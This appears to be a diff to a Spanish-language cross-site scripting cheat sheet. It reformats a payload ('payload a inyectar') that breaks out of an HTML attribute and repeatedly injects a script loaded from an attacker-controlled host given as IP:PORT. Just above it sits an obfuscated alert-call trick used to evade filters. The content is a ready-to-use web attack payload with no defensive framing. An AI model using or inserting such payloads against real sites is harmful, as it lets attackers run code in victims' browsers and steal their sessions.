@@ -155,9 +155,7 @@ top[8680439..toString(30)](1)
 
 ### payload a inyectar:
 ```
-"><script>setInterval(function()
-{d=document;z=d.createElement("scr
-ipt");z.src="//IP:PORT";d.body.appendChild(z)},0)</script>
+"><script>setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)</script>
 ```
 
 ### para escuchar:
